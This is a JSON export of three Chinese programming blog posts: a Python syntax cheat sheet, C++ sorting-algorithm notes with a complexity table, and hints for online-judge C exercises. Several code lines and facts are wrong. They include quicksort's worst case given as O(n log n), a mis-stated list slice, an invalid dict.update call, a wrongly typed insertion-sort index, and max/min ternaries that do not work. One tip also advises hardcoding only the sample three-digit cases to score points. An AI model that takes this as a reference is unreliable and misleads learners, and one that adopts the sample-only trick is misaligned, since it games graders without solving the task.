[{"content":"运算 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 # 除法自动转换为浮点数 35 / 5 # =\u0026gt; 7.0 # 向下取整除法 3 // -5 # =\u0026gt; -1 -5.0 // 3.0 # =\u0026gt; -2.0 # 取模正负与模数相同 -7 % 3 # =\u0026gt; 2 7 % -3 # =\u0026gt; -2 # 乘方 2 ** 4 # =\u0026gt; 16 # 逻辑运算符 True and 0 # =\u0026gt; False not -5 or False # =\u0026gt; True # 大小比较相连 1 \u0026lt; 3 \u0026lt; 2 # =\u0026gt; False 1 \u0026lt; 2 \u0026lt; 3 # =\u0026gt; True # if 表达式, 同比较元运算符\u0026#34; ? : \u0026#34; \u0026#34;python!\u0026#34; if 0 \u0026gt; 1 else \u0026#34;java!\u0026#34; # =\u0026gt; java! # is 表示是否为同个对象; == 表示值是否相同 a = [1,2,3,4] b = a b is a # =\u0026gt; True b = [1,2,3,4] b is a # =\u0026gt; False b == a # =\u0026gt; True # None 是一个对象, 只能用 is 判断 0 is None # =\u0026gt; False None is None # =\u0026gt; True # None, 0, 空字符串, 空列表, 空字典, 空元组都是 False bool(None) # =\u0026gt; False bool(0) # =\u0026gt; False bool(\u0026#34;\u0026#34;) # =\u0026gt; False bool([]) # =\u0026gt; False bool({}) # =\u0026gt; False bool(()) # =\u0026gt; False 变量 基本输入输出 1 2 3 4 5 6 7 8 9 10 11 12 13 14 # 输出, 默认以空行结尾, 使用附加参数可改变结尾 print(\u0026#34;Hello world\u0026#34;, end = \u0026#34;!\u0026#34;) # =\u0026gt; Hello world! # 输入, 返回字符串 input_string_var = input(\u0026#34;Enter some data: \u0026#34;) # 自动数据类型, 不用声明 # 数字类型: 整型, 浮点型, 布尔型, 复数型; 布尔型是整型的子类; 不可变类型 a, b, c, d = 20, 5.5, True, 4+3j # 元组解包赋值 print(type(a), type(b), type(c), type(d)) # =\u0026gt; \u0026lt;class \u0026#39;int\u0026#39;\u0026gt; \u0026lt;class \u0026#39;float\u0026#39;\u0026gt; \u0026lt;class \u0026#39;bool\u0026#39;\u0026gt; \u0026lt;class \u0026#39;complex\u0026#39;\u0026gt; # 访问未赋值变量会抛出异常 some_unknown_var # =\u0026gt; NameError 字符串 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 # 字符串类型 (string), 不可变类型 a = \u0026#34;This is a string\u0026#34; a[5] = \u0026#39;c\u0026#39; # =\u0026gt; TypeError # 字符串可以用单引号或双引号 \u0026#34;这是字符串\u0026#34; \u0026#39;这也是字符串\u0026#39; # 字符串连接 \u0026#34;Hello \u0026#34; + \u0026#34;World!\u0026#34; # =\u0026gt; \u0026#34;Hello World!\u0026#34; \u0026#34;Hello \u0026#34; \u0026#34;python!\u0026#34; # =\u0026gt; \u0026#34;Hello python!\u0026#34; 非变量形式时 # f-srings 格式化字符串, 大括号内可加入任何表达式 (3.6+) name = \u0026#34;python\u0026#34; f\u0026#34;{name} is {len(name)} characters long\u0026#34; # =\u0026gt; python is 6 characters long # .format 格式化字符串, 可使用参数或关键字 \u0026#34;{0} be nimble, {0} be quick, {0} jump over the {1}\u0026#34;.format(\u0026#34;Jack\u0026#34;, \u0026#34;candle stick\u0026#34;) # =\u0026gt; \u0026#34;Jack be nimble, Jack be quick, Jack jump over the candle stick\u0026#34; \u0026#34;{name} wants to eat {food}\u0026#34;.format(name = \u0026#34;Bob\u0026#34;, food = \u0026#34;lasagna\u0026#34;) # =\u0026gt; \u0026#34;Bob wants to eat lasagna\u0026#34; # %s 格式化字符串 (2.5-) \u0026#34;%s can be %s the %s way\u0026#34; % (\u0026#34;strings\u0026#34;, \u0026#34;interpolated\u0026#34;, \u0026#34;old\u0026#34;) # =\u0026gt; strings can be interpolated the old way 列表 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 # 列表类型 (list), 可变类型 li = [] other_li = [4, 5, 6] # 尾插与尾删 li.append(1) # li 为 [1] li.append(2) # li 为 [1, 2] li.append(4) # li 为 [1, 2, 4] li.pop() # li 为 [1, 2] li.append(3) # li 为 [1, 2, 3] li.append(4) # li 为 [1, 2, 3, 4] # 存取同数组, 从 0 开始, -1 表示取尾 li[0] # =\u0026gt; 1 li[-1] # =\u0026gt;4 # 越界存取会抛出异常 li[5] # =\u0026gt; IndexError # 切割 list[begin:end:step], 范围相当于 [begin,end) li[1:3] # =\u0026gt; [2,3] li[2:] # =\u0026gt; [3,4] li[:3] # =\u0026gt; [1, 2, 4] li[::2] # =\u0026gt; [1,4] li[::-1] # =\u0026gt; [4, 3, 2, 1] li2 = li[:] # =\u0026gt; li2为[1, 2, 3, 4] li2 is li # =\u0026gt; False # 删除指定位置元素 del li2[2] # =\u0026gt; li2 为 [1, 2, 4] # 删除匹配的第一个元素, 无匹配时抛出异常 li.remove(2) # =\u0026gt; li 为 [1, 3, 4] li.remove(0) # =\u0026gt; ValueError: 0 is not in the list # 指定位置插入元素 li.insert(1,2) # =\u0026gt; li 为 [1, 2, 3, 4] # 获取匹配的第一个元素的位置, 无匹配时抛出异常 li.index(1) # =\u0026gt; 0 li.index(0) # =\u0026gt; ValueError: 0 is not in the list # 列表相加 li + li_other # =\u0026gt; [1, 2, 3, 4, 4, 5, 6] # 列表拼接 li.extend(li_other) # =\u0026gt; li 变为 [1, 2, 3, 4, 4, 5, 6] # in 判断是否包含值 6 in li_other # =\u0026gt; True # len 获取长度 len(li) # =\u0026gt; 7 元组 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 # 元组类型 (tuple), 不可变类型 tup = (1, 2, 3) tup[0] # =\u0026gt; 1 tup[0] = 3 # =\u0026gt; TypeError 抛出异常 # 元素数量为1的元组必须要在末尾加逗号 type((1)) # =\u0026gt; \u0026lt;class \u0026#39;int\u0026#39;\u0026gt; type((1,)) # =\u0026gt; \u0026lt;class \u0026#39;tuple\u0026#39;\u0026gt; type(()) # =\u0026gt; \u0026lt;class \u0026#39;tuple\u0026#39;\u0026gt; # 大部分操作同列表, 更改元素除外 len(tup) # =\u0026gt; 3 tup + (4, 5, 6) # =\u0026gt; (1, 2, 3, 4, 5, 6) tup[:2] # =\u0026gt; (1, 2) 2 in tup # =\u0026gt; true # 元组解包赋值 a, b, c = (1, 2, 3) # a 为 1, b 为 2, c 为 3 # 扩展解包 a, *b, c = (1, 2, 3, 4) # a 为 1, b 为 [2, 3], c 为 3 # 元组括号可省略 d, e, f = 4, 5, 6 # 交换变量值 e, d = d, e # d 为 5, e 为 4 字典 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 # 字典类型 (dictionary), 可变类型, 存储 key 和 value 的映射关系 empty_dict = {} filled_dict = {\u0026#34;one\u0026#34;: 1, \u0026#34;two\u0026#34;: 2, \u0026#34;three\u0026#34;: 3} # key 必须为不可变类型且无重复值, 为确保 key 被转换为唯一的 hash-value 以用于快速查询 invalid_dict = {[1, 2, 3]: \u0026#34;123\u0026#34;} # =\u0026gt; TypeError: unhashable type \u0026#39;list\u0026#39; 抛出异常 valid_dict = {(1, 2, 3): [1, 2, 3]} # =\u0026gt; value 可为任何类型 # in 只能判断字典中是否包含 key \u0026#34;one\u0026#34; in filled_dict # =\u0026gt; True 1 in filled_dict # =\u0026gt; False # [key] 取值, key 不存在时抛出异常 filled_dict[\u0026#34;one\u0026#34;] # =\u0026gt; 1 filled_dict[\u0026#34;four\u0026#34;] # =\u0026gt; KeyError # 用 .get(key) 避免异常, 不存在时返回默认值, 无默认值时返回 None filled_dict.get(\u0026#34;one\u0026#34;, 4) # =\u0026gt; 1 filled_dict.get(\u0026#34;four\u0026#34;, 4) # =\u0026gt; 4 filled_dict.get(\u0026#34;four\u0026#34;) # =\u0026gt; None # 用 .keys() 获取所有 key, 用 .values() 获取所有 value # 返回可迭代对象, 需要包含在 list() 中以转换为列表 # (3.7-) 无序, (3.7+) 按照插入顺序 list(filled_dict.keys()) # =\u0026gt; [\u0026#34;one\u0026#34;, \u0026#34;two\u0026#34;, \u0026#34;three\u0026#34;] (3.7+) list(filled_dict.values()) # =\u0026gt; [1, 2, 3] (3.7+) # .setdefault() 在 key 不存在时插入新项 filled_dict.setdefault(\u0026#34;four\u0026#34;, 5) # =\u0026gt; \u0026#34;four\u0026#34;: 5 filled_dict.setdefault(\u0026#34;four\u0026#34;, 4) # =\u0026gt; \u0026#34;four\u0026#34;: 5 # 用 .update(key, value) 赋值 filled_dict.update(\u0026#34;four\u0026#34;, 4) filled_dict[\u0026#34;five\u0026#34;] = 5 # 另一种赋值方法 # del 删除项 del filled_dict[\u0026#34;five\u0026#34;] 集合 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 # 集合类型 (set), 可变类型, 元素必须为不可变类型, 元素不会重复 empty_set = set() some_set = {1, 1, 2, 2, 3, 4} # some_set 为 {1, 2, 3, 4} invalid_set = {[1], 1} # =\u0026gt; TypeError: unhashable type \u0026#39;list\u0026#39; 抛出异常 # 集合运算 other_set = {3, 4, 5, 6} some_set \u0026amp; other_set # =\u0026gt; {3, 4, 5} 取交集 some_set | other_set # =\u0026gt; {1, 2, 3, 4, 5, 6} 取并集 some_set - other_set # =\u0026gt; {1, 2} 取差集 some_set ^ other_set # =\u0026gt; {1, 2, 5, 6} 取对称差集 # 用 .add() 添加元素 some_set.add(5) # 用 .discard 删除元素 some_set.discard(5) some_set.discard(6) # =\u0026gt; 不会抛出异常 # 用 .copy() 复制集合 filled_set = some_set.copy() filled_set is some_set # =\u0026gt; False # in 判断元素是否在集合内 5 in some_set # =\u0026gt; False 流程控制 函数 模块 类 其他 ","date":"2023-10-14T00:00:00Z","permalink":"https://example.com/p/python%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/","title":"python快速入门"},{"content":"稳定是指关键字相同的记录在排序后保持原有相对次序不变, 只有在原有相对次序有意义时需要考虑.\n排序算法 平均时间复杂度 最好时间复杂度 最坏时间复杂度 空间复杂度 稳定性 冒泡排序 $O(n^2)$ $O(n)$ $O(n^2)$ $O(1)$ 稳定 快速排序 $O(n\\log(n))$ $O(n\\log(n))$ $O(n\\log(n))$ $O(\\log(n))$ 不稳定 选择排序 $O(n^2)$ $O(n^2)$ $O(n^2)$ $O(1)$ 不稳定 堆排序 $O(n\\log(n))$ $O(n\\log(n))$ $O(n\\log(n))$ $O(1)$ 不稳定 插入排序 $O(n^2)$ $O(n)$ $O(n^2)$ $O(1)$ 稳定 希尔排序 $O(n\\log(n))$ $O(n^{1.3})$ $O(n^2)$ $O(1)$ 不稳定 归并排序 $O(n\\log(n))$ $O(n\\log(n))$ $O(n\\log(n))$ $O(n)$ 稳定 计数排序 $O(n+k)$ $O(n+k)$ $O(n+k)$ $O(k)$ 稳定 桶排序 $O(n+k)$ $O(n+k)$ $O(n^2)$ $O(n+k)$ 稳定 基数排序 $O(nm)$ $O(nm)$ $O(nm)$ $O(n+m)$ 稳定 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 #include \u0026lt;vector\u0026gt; using namespace std; // 数列最大值 template\u0026lt;typename Type\u0026gt; static Type maximal(vector\u0026lt;Type\u0026gt;\u0026amp; arr) { Type max = arr[0]; for (int i = 1; i \u0026lt;= arr.size() - 1; ++i) { if (arr[i] \u0026gt; max) max = arr[i]; } return max; } // 数列最小值 template\u0026lt;typename Type\u0026gt; static Type minimal(vector\u0026lt;Type\u0026gt;\u0026amp; arr) { Type min = arr[0]; for (int i = 1; i \u0026lt;= arr.size() - 1; ++i) { if (arr[i] \u0026lt; min) min = arr[i]; } return min; } 冒泡排序 每轮遍历时两两比较并交换.\n1 2 3 4 5 6 7 8 9 10 11 12 13 template\u0026lt;typename Type\u0026gt; static void bubble(vector\u0026lt;Type\u0026gt;\u0026amp; arr) { for (int i = 0; i \u0026lt; arr.size() - 1; ++i) { bool isSwapped = false; // 记录交换情况 for (int j = 0; j \u0026lt; arr.size() - 1 - i; ++j){ if (arr[j] \u0026gt; arr[j + 1]){ // 若条件改为\u0026#34;\u0026gt;=\u0026#34;则不再稳定 std::swap(arr[j], arr[j + 1]); isSwapped = true; } } if(!isSwapped) break; // 本轮没有交换说明已经有序 } } 快速排序 快速排序本质为比较交换排序. 分区中随机选择一个基准, 所有小于基准值的放在基准一侧, 大于基准值的放在另一侧, 退出时, 基准位于中间位置, 递归操作.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 #include \u0026lt;random\u0026gt; template\u0026lt;typename Type\u0026gt; static void quickRecur(vector\u0026lt;Type\u0026gt;\u0026amp; arr, int left, int right){ if (left \u0026gt;= right) return; random_device seed; ranlux48 engine(seed()); uniform_int_distribution\u0026lt;\u0026gt; distrib(left,right); // 生成随机位置 int head = left, tail = right, flag = arr[distrib(engine)]; while (head \u0026lt; tail) { while (arr[head] \u0026lt; flag) ++head; // 左侧第一个小于基准的元素 while (arr[tail] \u0026gt; flag) --tail; // 右侧第一个大于基准的元素 if (head \u0026lt; tail) swap(arr[head], arr[tail]); // 小于基准的与大于基准的交换位置 else { // 本分区已经全部处理完 quickRecur(arr, left, tail); quickRecur(arr, tail+1, right); } } } 在重复值较多的场景下, 可以额外划分出一个区域将与基准值相等的元素聚集在基准值前后.\n选择排序 遍历过程中依次选出末尾序列中的最值元素放到序列起始位置.\n1 2 3 4 5 6 7 8 9 10 11 12 template\u0026lt;typename Type\u0026gt; static void selection(vector\u0026lt;Type\u0026gt;\u0026amp; arr) { for (int i = 0; i \u0026lt; arr.size() - 1; ++i) { int min = i; for (int j = i + 1; j \u0026lt; arr.size(); ++j) { if (arr[j] \u0026lt; arr[min]) { min = j; } } // 选出末尾序列中最小值 swap(arr[i], arr[min]); // 交换到序列起始位置 } } 堆排序 堆排序本质为选择最值排序. 堆是一个完全二叉树, 大根堆指父节点值总大于(等于)子节点值, 小根堆指父节点值总小于(等于)子节点值. 以升序为例, 创建大根堆, 交换根(当前最大值)到叶末尾, 固定叶末尾, 其余部分变为大根堆(找出下一个最大值), 重复操作直至所有元素固定.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 template\u0026lt;typename Type\u0026gt; static void push(vector\u0026lt;Type\u0026gt;\u0026amp; arr, int start, int end) { int dad = start, son = dad * 2 + 1; // 父节点和左子节点, 右子节点为\u0026#34;dad * 2 + 2\u0026#34; while (son \u0026lt;= end) { if ((son + 1 \u0026lt;= end) \u0026amp;\u0026amp; arr[son] \u0026lt; arr[son + 1]) ++son; // 选出子结点中较大的 if (arr[dad] \u0026gt; arr[son]) return; // 父节点大于子节点, 已为大根堆 else { swap(arr[dad], arr[son]); // 父节点小于等于子节点时, 互换 dad = son; son = dad * 2 + 1; // 再依次将子堆调整为大根堆 } } } template\u0026lt;typename Type\u0026gt; static void heap(vector\u0026lt;Type\u0026gt;\u0026amp; arr){ int size = arr.size(); for (int i = size / 2 - 1; i \u0026gt;= 0; --i) { push(arr, i, size-1); } // 构造大根堆 for (int i = size - 1; i \u0026gt; 0; --i) { swap(arr[0], arr[i]); // 交换当前末尾和根 push(arr, 0, i-1); // 固定好的末尾以外部分调整为大根堆 } } 插入排序 遍历时将当前元素插入到前面队列的相应位置, 该位置及其后的元素依次后移.\n1 2 3 4 5 6 7 8 9 10 11 static void insertion(vector\u0026lt;Type\u0026gt;\u0026amp; arr) { for (int i = 1; i \u0026lt; arr.size(); ++i) { Type flag = arr[i]; // 记录当前元素 Type j = i - 1; while ((j \u0026gt;= 0) \u0026amp;\u0026amp; (flag \u0026lt; arr[j])){ arr[j + 1] = arr[j]; --j; } // 找到位置时, 元素依次后移 arr[j + 1] = flag; } } 希尔排序 分割为若干子序列进行插入排序, 子序列有序后, 再合并进行插入排序, 循环操作.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 template\u0026lt;typename Type\u0026gt; static void shell(vector\u0026lt;Type\u0026gt;\u0026amp; arr) { int gap = 1; while (gap \u0026lt; arr.size() / 3){ gap = 3 * gap + 1; } // 子序列分割数 while (gap) { // 以gap为间隔的子序列分别进行插入排序 for (int i = gap; i \u0026lt; arr.size(); ++i) { for (int j = i; (j \u0026gt;= gap) \u0026amp;\u0026amp; (arr[j] \u0026lt; arr[j - gap]); j -= gap) { swap(arr[j], arr[j - gap]); } } gap /= 3; } } 归并排序 临时空间存储两个有序序列之和用来存放合并排序后的序列, 依次比较两个有序序列元素并存入临时空间, 重复上述操作.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 template\u0026lt;typename Type\u0026gt; static void mergeRecur(vector\u0026lt;Type\u0026gt;\u0026amp; arr, int start, int end) { if (start \u0026gt;= end) return; int mid = ((end - start) \u0026gt;\u0026gt; 1) + start; mergeRecur(arr, start, mid); // 左有序序列 mergeRecur(arr, mid + 1, end); // 右有序序列 static vector\u0026lt;Type\u0026gt; tmp; tmp.clear(); int left = start, right = mid + 1; // 两指针指向各自起始位置 while ((left \u0026lt;= mid) \u0026amp;\u0026amp; (right \u0026lt;= end)){ if (arr[left] \u0026lt;= arr[right]) tmp.push_back(arr[left++]); else tmp.push_back(arr[right++]); // 较小的元素存入临时数组, 较小元素序列指针右移 } while (left \u0026lt;= mid) tmp.push_back(arr[left++]); while (right \u0026lt;= end) tmp.push_back(arr[right++]); // 将剩余元素序列的元素依次存入临时数组 for (int i : tmp) arr[start++] = i; } 计数排序 非比较方式排序, 而是直接记录元素位置和个数并反向填充原数组, 只适用于整数排序.\n1 2 3 4 5 6 7 8 9 10 11 static void counting(vector\u0026lt;int\u0026gt;\u0026amp; arr) { int max = maximal(arr), min = minimal(arr), range = max - min + 1; static vector\u0026lt;int\u0026gt; cnt(range,0); // 用于记录的数组 for (int i : arr) ++cnt[i - min]; // 记录元素相对位置及个数 for (int i = 0, j = 0; i \u0026lt;= range - 1; ++i) { while (cnt[i]) { arr[j++] = i + min; // 反向填充原数组 --cnt[i]; } } } 桶排序 减少计数排序浪费的空间, 使用映射函数(类似于Hash函数), 映射后分布均匀时效率最高, 桶内部使用插入排序.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 static void bucket(vector\u0026lt;int\u0026gt;\u0026amp; arr) { int max = maximal(arr), min = minimal(arr); int size = (max - min) / int(arr.size()) + 1, num = (max - min) / size + 1; // 确定桶容量和桶个数 vector\u0026lt;int\u0026gt; buckets[num]; for (int i = 0; i \u0026lt;= arr.size() - 1; ++i) { int idx = (arr[i] - min) / size; // 映射函数 buckets[idx].push_back(arr[i]); // 元素入桶 // 桶内使用插入排序 for (int j = int(buckets[idx].size()) - 1; j \u0026gt; 0; --j) { if (buckets[idx][j] \u0026lt; buckets[idx][j - 1]) swap(buckets[idx][j],buckets[idx][j - 1]); } } for (int i = 0, j = 0; i \u0026lt;= num - 1; ++i) { for (int k = 0; k \u0026lt;= int(buckets[i].size()) - 1; ++k) arr[j++] = buckets[i][k]; // 反向填充原数组 } } 基数排序 非比较方式排序, 将元素本身切分并逐部分比较, 除整数外, 还适用于特定格式的字符串和浮点数.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 static void radix(vector\u0026lt;int\u0026gt;\u0026amp; arr) { int max = maximal(arr), digit = 0, shift = 1, size = int(arr.size()); while (max) { max /= 10; ++digit; } // 获取位数 vector\u0026lt;int\u0026gt; tmp(size, 0); // 从低位开始排序 for (int i = 0; i \u0026lt; digit; ++i) { vector\u0026lt;int\u0026gt; cnt(10,0); // 内部使用计数排序 for (int j = 0; j \u0026lt; size; ++j) { int k = (arr[j] / shift) % 10; ++cnt[k]; } for (int j = 1; j \u0026lt; 10; ++j) { cnt[j] = cnt[j - 1] + cnt[j]; } for (int j = size - 1; j \u0026gt;= 0; --j) { int k = (arr[j] / shift) % 10; tmp[cnt[k] - 1] = arr[j]; --cnt[k]; } for (int j = 0; j \u0026lt; size; ++j) { arr[j] = tmp[j]; } shift *= 10; } } 衍生问题 逆序对数量 在数组 $a[n]$ 中, 若 $0\\leq i\u0026lt;j\\leq n-1$ 且 $a[i] \u0026gt; a[j]$, 则有序对 $(a[i],a[j])$ 被称为逆序对, 现求数组中全部逆序对数量.\n在归并过程中累加: \u0026ldquo;cnt += mid - left + 1;\u0026rdquo; 第 $k$ 大的数 在不排列数组 $a[n]$ 情况下, 求数组中第 $1\\leq k\\leq n$ 大的数.\n快排过程中, 若基准右侧元素个数超过 $k$ 则所求一定在右侧, 忽略左侧递归; 时间复杂度为 $O(n)$. ","date":"2023-10-12T00:00:00Z","permalink":"https://example.com/p/%E6%8E%92%E5%BA%8F/","title":"排序"},{"content":"主要给出了WA时可能会出现的错误, 节省调试时间, 并方便日后回顾; 建议提交一次后对照查询, 其他问题请本地调试解决.\n由于从11题开始题目顺序会打乱, 故给出题目名称, 请按题目名称查找.\nHello World 略.\nA+B 略.\n数据类型大小及范围 可使用switch-case进行条件判断.\n使用CHAR_MAX等宏时, 注意包含头文件\u0026lt;limits.h\u0026gt;.\n平均值 直接相加可能会越界.\n1 int avg = ((a-b)\u0026gt;\u0026gt;1)+b; 进制转换 输出大写十六进制需使用\u0026quot;%X\u0026quot;, \u0026ldquo;%x\u0026quot;会输出小写十六进制.\n浮点数输出 略.\n动态宽度输出 可使用\u0026quot;tmp/10\u0026quot;做十进制向右移位获取输入数字长度.\n1 2 3 4 5 6 cnt = 0, tmp = n; while(tmp){ tmp /= 10; ++cnt; } if (!n) cnt = 1; 计算地球上两点之间的距离 C中三角函数仅接收弧度参数, 需先将经纬度转换为弧度.\n1 2 #define Pi 3.1415926 phi1 = phi1*PI/180; 风寒指数 输出要求四舍五入, 只做类型转换是截断.\n1 int chillInt = (int)(chillDouble+0.5f); 颜色模型转换 取最大值和最小值, 可使用比较运算符.\n1 2 int max = r \u0026gt;= g ? (r \u0026gt;= b ? r : b) : (r \u0026gt;= b ? r : b); int min = r \u0026lt;= g ? (r \u0026lt;= b ? r : b) : (r \u0026lt;= b ? r : b); 如果使用浮点型比较, 浮点数不精确, 不能直接使用\u0026quot;a == b\u0026rdquo;, 应当使用\u0026quot;a-b \u0026lt; 1e-9\u0026quot;.\n如果使用整型比较, 计算时应当进行类型转换(强制或隐式), 否则\u0026quot;/\u0026ldquo;左右操作数均为整数时只能得到整数.\n此外, 每个除数都应当判断不为0.\n乘数模 直接相乘可能会越界, 先取模再相乘再取模.\n1 r = ((a%m)*(b%m))%m; 方阵 可使用比较运算符得到矩阵元素. 无需使用数组.\n1 a = (col-raw) ? (col-raw) : (raw-col); // a[col][raw] 分数的加、减、乘、除法 可使用\u0026quot;getchar();\u0026ldquo;取走输入中的\u0026rdquo;/\u0026rdquo;.\n约分时, 可使用辗转相除法得到分子分母最大公因数, 再分别除掉.\n1 2 3 4 int gcd(int a,int b){ if (b == 0) return a; else return gcd(b,a%b); } 结果中若出现负分数, 只需保证最大公因数为正即可.\n1 2 int d = gcd(m,n); d = d \u0026gt; 0 ? d : -d; 操作数 同“动态宽度输出”, \u0026ldquo;%10\u0026quot;可以得到个位数, \u0026ldquo;/10\u0026quot;可以十进制下向右移动一位.\n组合数 动态规划题, 但由于 $n\\leq 50$, 暴搜不会超时.\n比率 \u0026ldquo;*10\u0026quot;实现十进制下向左移动一位, 直到变成整数, 判断不是整数可使用\u0026quot;x != floor(x)\u0026rdquo;.\n得到最大公因数并约分, 同\u0026quot;分数的加、减、乘、除法\u0026rdquo;.\n级数和 \u0026ldquo;/10\u0026quot;实现十进制下右移一位, 直到没有整数部分, 判断有整数部分可使用\u0026rdquo;(int)x\u0026rdquo;.\n舍去末尾的0, 可使用\u0026quot;%g\u0026quot;格式化输出.\n对称数 \u0026ldquo;fget(num,11,stdin)\u0026ldquo;获取数字为字符串, 并替换掉末尾换行符.\n1 2 char *find = strchr(num,\u0026#39;\\n\u0026#39;); // strchr()在头文件\u0026lt;string.h\u0026gt;中 if(find) *find = \u0026#39;\\0\u0026#39;; 使用\u0026quot;strlen()\u0026ldquo;获取长度, 也需引入头文件\u0026lt;string.h\u0026gt;.\n翻转分为数字改变和位置改变. 数字(实则为字符)改变为: \u0026lsquo;6\u0026rsquo;-\u0026gt;\u0026lsquo;9\u0026rsquo;, \u0026lsquo;9\u0026rsquo;-\u0026gt;\u0026lsquo;6\u0026rsquo;, \u0026lsquo;0\u0026rsquo;-\u0026gt;\u0026lsquo;0\u0026rsquo;, \u0026lsquo;1\u0026rsquo;-\u0026gt;\u0026lsquo;1\u0026rsquo;, \u0026lsquo;8\u0026rsquo;-\u0026gt;\u0026lsquo;8\u0026rsquo;. 位置改变为第i位换到第(len-i-1)位.\n可使用switch-case翻转后再逐位判断, 或直接判断; 包含其他数字时(default)则直接输出\u0026quot;No\u0026rdquo;.\n偷分寄巧: 由于该题样例只有三位数, 可直接暴力判断\n1 2 3 4 5 6 7 8 9 10 int a = (n/100)%10; int b = (n/10)%10; int c = n%10; if ((b == 0 || b == 1 || b == 8) \u0026amp;\u0026amp; ((a == 6 \u0026amp;\u0026amp; c == 9) || (a == 9 \u0026amp;\u0026amp; c == 6) || ((a == 0 || a == 1 || a == 8) \u0026amp;\u0026amp; (c == 0 || c == 1 || c == 8)))){ printf(\u0026#34;Yes\\n\u0026#34;); } else { printf(\u0026#34;No\\n\u0026#34;); } 幂数模 直接求幂再求模可能会越界超时, 须使用快速模幂.\n$b=2k$ 时, 有 $a^b\\equiv(a^k)^2 ({\\rm mod}\\ m)$; $b=2k+1$ 时, 有 $a^b\\equiv(a^k)^2\\times a ({\\rm mod}\\ m)$.\n1 2 3 4 5 6 7 8 9 10 11 12 13 typedef unsigned long long uint64; uint64 fastPowerMod (uint64 t, uint64 e, uint64 m){ uint64 r = 1; while (e){ if (e\u0026amp;1){ r = (r*t)%m; } t = (t*t)%m; e \u0026gt;\u0026gt;= 1; } return r; } 倍数和 输入采用动态数组或足够大的数组或直接循环均可.\n1 2 3 4 5 6 7 8 unsigned int t; scanf(\u0026#34;%u\u0026#34;,\u0026amp;t); // 以下四种方法任选其一 unsigned int n[t]; // 1. MSVC会报错, 但GCC支持, 可以AC unsigned int *n = (unsigned int *)malloc(t*sizeof(unsigned int)); // 2. MSVC和GCC均支持, 但需引入头文件\u0026lt;malloc.h\u0026gt; unsigned int n[100000] // 3. 足够大的数组, 不会溢出, 不会超出内存限制 for (unsigned int i = 1; i \u0026lt;= t; ++i); // 4. 循环读取输入并输出 暴搜, 不会超时.\n余数和 输入顺序.\n最大数字 条件为小于或等于 $n$.\n倒水 使用BFS(广度优先), 将水杯状态视为顶点, 状态间的转移即为边, 每次转移相对(初始状态)距离加1; $(0,0)$为初始状态, 检索到 $(0,d)$ 或 $(d,0)$ 时终止, 此时距离矩阵中对应元素值即为最小操作次数.\n1 2 3 4 5 6 #include \u0026lt;string.h\u0026gt; #define INF 0x3f3f3f3f // 无穷大, 表示未检索 int distTable[10000][10000]; // 距离矩阵 memset(distTable, 0x3f, sizeof(distTable)); // 初始化 distTable[0][0] = 0; // 设置初始状态 每次状态转移共有八种情况: (记左为0, 右为1)\n装满0: $(a,b)\\to (n,b)$; 装满1: $(a,b)\\to (a,m)$; 倒空0: $(a,b)\\to (0,b)$; 倒空1: $(a,b)\\to (a,0)$; 0倒入1, 1未满: $(a,b)\\to (0,a+b)$, $a+b\u0026lt;m$; 0倒入1, 1已满: $(a,b)\\to (a+b-m,m)$, $a+b\\geq m$; 1倒入0, 0未满: $(a,b)\\to (a+b,0)$, $a+b\u0026lt;n$; 1倒入0, 0已满: $(a,b)\\to (n,a+b-n)$, $a+b\\geq n$. 使用数组表示循环队列, 当前状态为队首, 转移后插入至队尾.\n1 2 3 4 5 6 7 8 9 #define MAXSIZE 10000 int queue[MAXSIZE][2] = {0}; // 循环队列并初始化 int head = 0; // 队首指向0 int tail = 1; // 队尾指向1 // 移动队首队尾时用取余实现循环效果 head = (head+1)%MAXSIZE tail = (tail+1)%MAXSIZE 好数字 同幂数模.\n$$\\frac{n+1}{2} = \\begin{cases} k, \\ n=2k \\\\ k+1, \\ n=2k+1 \\\\ \\end{cases}$$\n毕达哥拉斯三元组 不妨设 $a$ 为短直角边, $b$ 为长直角边; 则 $a\\in (0,\\frac{n}{4})$, $b\\in [a,\\frac{n}{2})$.\n$a\\times b\\times c$可能越界, 使用unsigned long long.\n竖式乘法 \u0026ldquo;/10\u0026quot;获取位数\u0026quot;len(num)\u0026rdquo;.\n获取右数第 $n$ 位数字.\n1 2 3 4 #include \u0026lt;math.h\u0026gt; x /= (uint)pow(10,n-1); x %= 10; 总宽度为\u0026quot;lenTotal = len(ans)+1;\u0026rdquo;, 加算中第 $i$ 列空格数为 \u0026ldquo;j \u0026lt;= lenTotal-len(current)-(i-1);\u0026rdquo; 亦即 \u0026ldquo;j \u0026lt; lenTotal-len(current)-i\u0026rdquo;.\n查找数列 写成下三角形式, 第 $n$ 列末尾项数为 $1+2+\u0026hellip;+n$.\n1 2 3 4 5 6 7 cnt = 1, sum = 0; while(n-sum \u0026gt; 0){ sum += cnt; ++cnt; } sum -= cnt; ans = n-sum == 0 ? cnt : (n-sum-1); 俄罗斯农夫乘法 在循环输出中判断并累加即可.\n阶乘倍数 枚举阶乘模可能会超时, 可以改为对 $k$ 因子分解后二分查找.\n可以使用两个数组记录因子分解情况再二分查找, 也可以在二分查找过程中不断分解 $k$.\n正整数均有唯一分解形式: $k=\\prod p_i^{\\alpha_i}$, $p_i$ 